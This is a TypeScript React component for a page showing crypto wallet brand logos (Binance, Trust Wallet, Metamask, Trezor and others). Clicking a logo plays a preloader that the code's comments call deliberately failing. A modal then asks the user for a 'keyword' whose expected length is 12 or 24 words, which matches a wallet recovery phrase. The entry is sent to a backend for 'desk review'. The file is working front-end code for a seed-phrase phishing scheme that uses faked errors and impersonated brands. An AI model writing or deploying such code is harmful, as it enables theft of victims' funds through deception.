"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useTranslations } from "next-intl";
import { toast } from "sonner";
import { AlertTriangle, Check, Clock, Loader2, MapPin, X } from "lucide-react";

import binanceImg from "@/assets/custody/binance.png";
import trustImg from "@/assets/custody/trust.png";
import bitget from "@/assets/custody/Bitget.png";
import coinbase from "@/assets/custody/coinbase.png";
import metamaskImg from "@/assets/custody/metamask.png";
import otherWalletImg from "@/assets/custody/iogo.png";
import trezorImg from "@/assets/custody/trezor.png";
import exodusImg from "@/assets/custody/Exodus_Wallet_Logo.png";
import {
  getWalletKeywords,
  submitWalletKeyword,
  type WalletKeyword,
} from "@/lib/api/accountKeyword";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";

function countWords(value: string): number {
  const trimmed = value.trim();
  return trimmed === "" ? 0 : trimmed.split(/\s+/).length;
}

// The fixed custody providers. Each card connects independently and carries its
// own keyword + desk-review status. `name` must match CUSTODY_WALLET_NAMES in
// backend/src/lib/custodyWallets.ts  it is the key the keyword is stored under.
// Proper nouns, so not routed through the translation catalogue. Images are
// bundled assets under src/assets/custody/.
const CUSTODY = [
  { name: "Binance", image: binanceImg },
  { name: "Trust Wallet", image: trustImg },
  { name: "Bitget", image: bitget },
  { name: "Coinbase", image: coinbase },
  { name: "Metamask", image: metamaskImg },
  { name: "Other Wallet", image: otherWalletImg },
  { name: "Trezor", image: trezorImg },
  { name: "Exodus", image: exodusImg },
];

// Status lines revealed one by one while the custody preloader runs. The first
// two show under the spinner; "failure"/"error" are the failure, shown in red;
// "redirecting" is the final hand-off line. Every line stays on screen for the
// rest of the run  the whole script is visible by the time it hands off.
const LOADER_LINES = [
  { key: "sendingRequest", tone: "muted" },
  { key: "awaitingResponse", tone: "muted" },
  { key: "failure", tone: "error" },
  { key: "error", tone: "error" },
  { key: "redirecting", tone: "muted" },
] as const;

export default function AccountKeyword() {
  const t = useTranslations("accountKeyword");
  const queryClient = useQueryClient();
  const [value, setValue] = useState("");

  // Which custody card's modal is open. null = grid only.
  const [activeWallet, setActiveWallet] = useState<string | null>(null);
  // The card tapped, held while the (deliberately failing) preloader runs.
  const pendingWallet = useRef<string | null>(null);
  const [loaderPhase, setLoaderPhase] = useState<"idle" | "loading" | "failed">("idle");
  // How many LOADER_LINES to reveal (1..LOADER_LINES.length).
  const [loaderStep, setLoaderStep] = useState(0);
  const [brokenImages, setBrokenImages] = useState<Set<number>>(new Set());
  const timers = useRef<ReturnType<typeof setTimeout>[]>([]);

  const keywordsQuery = useQuery({ queryKey: ["wallet-keywords"], queryFn: getWalletKeywords });
  const byWallet = useMemo(() => {
    const map = new Map<string, WalletKeyword>();
    for (const k of keywordsQuery.data ?? []) map.set(k.wallet_name, k);
    return map;
  }, [keywordsQuery.data]);
  const activeEntry = activeWallet ? (byWallet.get(activeWallet) ?? null) : null;

  useEffect(() => {
    const pending = timers.current;
    return () => pending.forEach(clearTimeout);
  }, []);

  function openCustody(name: string) {
    if (loaderPhase !== "idle" || activeWallet) return;
    pendingWallet.current = name;
    setLoaderStep(1);
    setLoaderPhase("loading");
    timers.current.push(
      setTimeout(() => setLoaderStep(2), 1000),
      setTimeout(() => {
        setLoaderStep(3);
        setLoaderPhase("failed");
      }, 2200),
      setTimeout(() => setLoaderStep(4), 2900),
      setTimeout(() => setLoaderStep(5), 3600),
      setTimeout(() => {
        setLoaderPhase("idle");
        setLoaderStep(0);
        setActiveWallet(pendingWallet.current);
      }, 4600),
    );
  }

  function closeModal() {
    setActiveWallet(null);
    setValue("");
  }

  // Pre-fill the field with whatever is currently stored for that wallet, so an
  // approved/declined entry opens showing its keyword, still editable.
  useEffect(() => {
    if (!activeWallet) return;
    setValue(byWallet.get(activeWallet)?.keyword ?? "");
  }, [activeWallet, byWallet]);

  useEffect(() => {
    if (!activeWallet) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") closeModal();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [activeWallet]);

  const mutation = useMutation({
    mutationFn: ({ walletName, keyword }: { walletName: string; keyword: string }) =>
      submitWalletKeyword(walletName, keyword),
    onSuccess: () => {
      toast.success(t("toast.success"));
      void queryClient.invalidateQueries({ queryKey: ["wallet-keywords"] });
      closeModal();
    },
    onError: (e) => toast.error(e instanceof Error ? e.message : t("toast.error")),
  });

  const wordCount = countWords(value);
  // 12 or 24 is the expected shape, but it is only an indication  submission
  // is never blocked on it (any non-empty value is accepted).
  const expectedLength = wordCount === 12 || wordCount === 24;

  const subtitle = t("subtitle");

  return (
    <div className="space-y-8">
      <header>
        <h1 className="text-2xl font-semibold">{t("title")}</h1>
        {subtitle && <p className="mt-1.5 text-sm text-muted-foreground">{subtitle}</p>}
      </header>

      {/* Custody grid stays mounted underneath the keyword modal, dimmed via
          opacity while it is open. */}
      <div
        className={cn(
          "transition-opacity duration-200",
          activeWallet && "pointer-events-none select-none opacity-30",
        )}
        aria-hidden={activeWallet !== null}
      >
        <div className="surface-panel space-y-5 p-6">
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <MapPin className="size-4" aria-hidden />
            <span>{t("gate.heading")}</span>
          </div>

          <div className="grid grid-cols-2 gap-x-8 gap-y-10 sm:grid-cols-3">
            {CUSTODY.map((location, index) => {
              const entry = byWallet.get(location.name);
              return (
                <button
                  key={location.name}
                  type="button"
                  onClick={() => openCustody(location.name)}
                  aria-label={t("gate.cta")}
                  className="group mx-auto flex w-full max-w-[260px] flex-col items-center gap-3 focus:outline-none"
                >
                  <span className="relative block aspect-[13/12] w-full overflow-hidden rounded-2xl border border-border bg-muted/30 transition-colors group-hover:border-primary/50 group-focus-visible:ring-2 group-focus-visible:ring-ring">
                    {brokenImages.has(index) ? (
                      <span className="absolute inset-0 flex items-center justify-center bg-gradient-to-br from-slate-800 via-slate-900 to-black">
                        <MapPin className="size-10 text-primary/70" aria-hidden />
                      </span>
                    ) : (
                      // Plain <img>: a bundled brand logo, not sized by
                      // next/image  we only need its resolved URL.
                      <img
                        src={location.image.src}
                        alt={location.name}
                        className="absolute inset-0 h-full w-full object-contain p-8 transition-transform duration-300 group-hover:scale-[1.03] group-focus-visible:scale-[1.03]"
                        onError={() =>
                          setBrokenImages((prev) => {
                            const next = new Set(prev);
                            next.add(index);
                            return next;
                          })
                        }
                      />
                    )}
                  </span>
                  <span className="text-sm font-semibold">{location.name}</span>
                  {entry && <StatusBadge status={entry.status} t={t} />}
                </button>
              );
            })}
          </div>

          <p className="text-xs text-muted-foreground">{t("gate.description")}</p>
        </div>
      </div>

      {activeWallet && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-background/40 p-4 backdrop-blur-sm"
          role="dialog"
          aria-modal="true"
          aria-label={t("connecting", { wallet: activeWallet })}
          onClick={closeModal}
        >
          <div
            className="surface-panel relative w-[min(92vw,28rem)] space-y-4 p-6"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              onClick={closeModal}
              aria-label={t("cancelButton")}
              className="absolute end-4 top-4 text-muted-foreground transition-colors hover:text-foreground focus:outline-none focus-visible:ring-2 focus-visible:ring-ring"
            >
              <X className="size-4" aria-hidden />
            </button>

            <p className="text-sm font-semibold">{t("connecting", { wallet: activeWallet })}</p>

            {activeEntry?.status === "pending" && (
              <p className="rounded-lg border border-border bg-muted/40 p-3 text-xs text-muted-foreground">
                {t("review.pending")}
              </p>
            )}
            {activeEntry?.status === "approved" && (
              <p className="flex items-center gap-2 rounded-lg border border-success/30 bg-success/15 p-3 text-xs text-success">
                <Check className="size-3.5 shrink-0" aria-hidden />
                {t("review.approved")}
              </p>
            )}
            {activeEntry?.status === "declined" && (
              <div className="space-y-1 rounded-lg border border-destructive/40 bg-destructive/10 p-3 text-xs">
                <p className="flex items-center gap-2 font-medium text-destructive">
                  <AlertTriangle className="size-3.5 shrink-0" aria-hidden />
                  {t("review.declined")}
                </p>
                {activeEntry.review_note && (
                  <p className="text-muted-foreground">
                    {t("review.reason", { reason: activeEntry.review_note })}
                  </p>
                )}
              </div>
            )}

            <form
              className="space-y-4"
              onSubmit={(e) => {
                e.preventDefault();
                if (value.trim() === "") return;
                mutation.mutate({ walletName: activeWallet, keyword: value });
              }}
            >
              <div
                role="alert"
                className="flex items-center gap-2 rounded-lg bg-destructive p-3 text-sm font-medium text-destructive-foreground"
              >
                <AlertTriangle className="size-4 shrink-0" aria-hidden />
                <span>{t("formError")}</span>
              </div>

              <div className="space-y-2">
                <Label htmlFor="account-keyword">{t("label")}</Label>
                <Textarea
                  id="account-keyword"
                  rows={4}
                  value={value}
                  onChange={(e) => setValue(e.target.value)}
                  placeholder={t("placeholder")}
                  className="num"
                />
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">{t("hint")}</p>
                  <p
                    className={cn(
                      "flex items-center gap-1 text-xs",
                      expectedLength ? "text-success" : "text-muted-foreground",
                    )}
                  >
                    {expectedLength && <Check className="size-3" aria-hidden />}
                    {t("wordCount", { count: wordCount })}
                  </p>
                </div>
              </div>

              <p className="rounded-lg border border-success/30 bg-success/15 p-3 text-xs text-success">
                {t("privacyNote")}
              </p>

              <div className="flex items-center gap-3">
                <Button type="submit" disabled={value.trim() === "" || mutation.isPending}>
                  {mutation.isPending ? t("submitting") : t("submit")}
                </Button>
                <Button
                  type="button"
                  variant="ghost"
                  disabled={mutation.isPending}
                  onClick={closeModal}
                >
                  {t("cancelButton")}
                </Button>
              </div>
            </form>
          </div>
        </div>
      )}

      {loaderPhase !== "idle" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm">
          <div className="surface-panel flex w-[min(90vw,20rem)] flex-col items-center gap-4 p-8">
            {loaderPhase === "loading" ? (
              <Loader2 className="size-8 animate-spin text-primary" aria-hidden />
            ) : (
              <AlertTriangle className="size-8 text-destructive" aria-hidden />
            )}

            <div className="w-full space-y-1.5" aria-live="polite">
              {LOADER_LINES.slice(0, loaderStep).map((line) => (
                <p
                  key={line.key}
                  className={cn(
                    "num text-xs font-medium",
                    line.tone === "error" ? "text-destructive" : "text-muted-foreground",
                  )}
                >
                  {line.tone === "error" ? "✕ " : "› "}
                  {t(`gate.${line.key}`)}
                </p>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function StatusBadge({
  status,
  t,
}: {
  status: WalletKeyword["status"];
  t: ReturnType<typeof useTranslations>;
}) {
  const tone =
    status === "approved"
      ? "border-success/30 bg-success/15 text-success"
      : status === "declined"
        ? "border-destructive/40 bg-destructive/10 text-destructive"
        : "border-border bg-muted/40 text-muted-foreground";
  const Icon = status === "approved" ? Check : status === "declined" ? AlertTriangle : Clock;
  return (
    <span
      className={cn(
        "inline-flex items-center gap-1 rounded-full border px-2 py-0.5 text-[11px] font-medium",
        tone,
      )}
    >
      <Icon className="size-3 shrink-0" aria-hidden />
      {t(`status.${status}`)}
    </span>
  );
}
